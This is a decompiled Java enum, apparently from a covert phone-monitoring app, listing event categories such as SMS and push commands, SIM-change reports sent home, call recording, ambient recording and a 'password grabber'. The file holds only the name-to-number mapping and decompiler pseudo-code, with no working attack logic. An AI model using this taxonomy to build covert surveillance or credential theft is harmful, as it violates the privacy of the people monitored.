package com.vvt.events;

import java.util.HashMap;
import java.util.Map;

public enum FxSystemEventCategories
{
  private static final Map a;
  private final int number;
  
  static
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    Object localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_GENERAL", 0, m);
    CATEGORY_GENERAL = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SMS_CMD", m, k);
    CATEGORY_SMS_CMD = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SMS_CMD_REPLY", k, j);
    CATEGORY_SMS_CMD_REPLY = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PCC", j, i);
    CATEGORY_PCC = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PCC_REPLY", i, 5);
    CATEGORY_PCC_REPLY = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SIM_CHANGE", 5, 6);
    CATEGORY_SIM_CHANGE = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_BATTERY_INFO", 6, 7);
    CATEGORY_BATTERY_INFO = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_DEBUG_MESSAGE", 7, 8);
    CATEGORY_DEBUG_MESSAGE = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_MEMORY_INFO", 8, 9);
    CATEGORY_MEMORY_INFO = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_DISK_INFO", 9, 10);
    CATEGORY_DISK_INFO = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_RUNNING_PROCESS", 10, 11);
    CATEGORY_RUNNING_PROCESS = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_APP_CRASH", 11, 12);
    CATEGORY_APP_CRASH = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SIGNAL_STRENGTH", 12, 13);
    CATEGORY_SIGNAL_STRENGTH = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_DATABASE_INFO", 13, 14);
    CATEGORY_DATABASE_INFO = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_MEDIA_ID_NOT_FOUND", 14, 15);
    CATEGORY_MEDIA_ID_NOT_FOUND = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_APP_TERMINATED", 15, 16);
    CATEGORY_APP_TERMINATED = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SIM_CHANGE_NOTIFICATION_HOME_IN", 16, 17);
    CATEGORY_SIM_CHANGE_NOTIFICATION_HOME_IN = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_CALL_NOTIFICATION_HOME_IN", 17, 18);
    CATEGORY_CALL_NOTIFICATION_HOME_IN = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN", 18, 19);
    CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_MEDIA_EVENT_MAX_REACHED", 19, 20);
    CATEGORY_MEDIA_EVENT_MAX_REACHED = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PUSH_CMD", 20, 21);
    CATEGORY_PUSH_CMD = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PUSH_CMD_REPLY", 21, 22);
    CATEGORY_PUSH_CMD_REPLY = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_MEDIA_FILE_NOT_FOUND", 22, 23);
    CATEGORY_MEDIA_FILE_NOT_FOUND = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_SECURITY", 23, 24);
    CATEGORY_SECURITY = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_CALL_RECORDING", 24, 25);
    CATEGORY_CALL_RECORDING = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_PASSWORD_GRABBER", 25, 26);
    CATEGORY_PASSWORD_GRABBER = (FxSystemEventCategories)localObject;
    localObject = new com/vvt/events/FxSystemEventCategories;
    int i1 = 26;
    int i2 = 27;
    ((FxSystemEventCategories)localObject).<init>("CATEGORY_AMBIENT_RECORDING", i1, i2);
    CATEGORY_AMBIENT_RECORDING = (FxSystemEventCategories)localObject;
    int i3 = 27;
    localObject = new FxSystemEventCategories[i3];
    FxSystemEventCategories localFxSystemEventCategories1 = CATEGORY_GENERAL;
    localObject[0] = localFxSystemEventCategories1;
    localFxSystemEventCategories1 = CATEGORY_SMS_CMD;
    localObject[m] = localFxSystemEventCategories1;
    localFxSystemEventCategories1 = CATEGORY_SMS_CMD_REPLY;
    localObject[k] = localFxSystemEventCategories1;
    localFxSystemEventCategories1 = CATEGORY_PCC;
    localObject[j] = localFxSystemEventCategories1;
    localFxSystemEventCategories1 = CATEGORY_PCC_REPLY;
    localObject[i] = localFxSystemEventCategories1;
    FxSystemEventCategories localFxSystemEventCategories2 = CATEGORY_SIM_CHANGE;
    localObject[5] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_BATTERY_INFO;
    localObject[6] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_DEBUG_MESSAGE;
    localObject[7] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_MEMORY_INFO;
    localObject[8] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_DISK_INFO;
    localObject[9] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_RUNNING_PROCESS;
    localObject[10] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_APP_CRASH;
    localObject[11] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_SIGNAL_STRENGTH;
    localObject[12] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_DATABASE_INFO;
    localObject[13] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_MEDIA_ID_NOT_FOUND;
    localObject[14] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_APP_TERMINATED;
    localObject[15] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_SIM_CHANGE_NOTIFICATION_HOME_IN;
    localObject[16] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_CALL_NOTIFICATION_HOME_IN;
    localObject[17] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_PHONE_NUMBER_UPDATE_HOME_IN;
    localObject[18] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_MEDIA_EVENT_MAX_REACHED;
    localObject[19] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_PUSH_CMD;
    localObject[20] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_PUSH_CMD_REPLY;
    localObject[21] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_MEDIA_FILE_NOT_FOUND;
    localObject[22] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_SECURITY;
    localObject[23] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_CALL_RECORDING;
    localObject[24] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_PASSWORD_GRABBER;
    localObject[25] = localFxSystemEventCategories2;
    localFxSystemEventCategories2 = CATEGORY_AMBIENT_RECORDING;
    localObject[26] = localFxSystemEventCategories2;
    b = (FxSystemEventCategories[])localObject;
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    a = (Map)localObject;
    localObject = values();
    int i4 = localObject.length;
    while (n < i4)
    {
      localFxSystemEventCategories2 = localObject[n];
      Map localMap = a;
      m = localFxSystemEventCategories2.number;
      Integer localInteger = Integer.valueOf(m);
      localMap.put(localInteger, localFxSystemEventCategories2);
      n += 1;
    }
  }
  
  private FxSystemEventCategories(int paramInt1)
  {
    this.number = paramInt1;
  }
  
  public static FxSystemEventCategories forValue(int paramInt)
  {
    Map localMap = a;
    Integer localInteger = Integer.valueOf(paramInt);
    return (FxSystemEventCategories)localMap.get(localInteger);
  }
  
  public int getNumber()
  {
    return this.number;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/events/FxSystemEventCategories.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */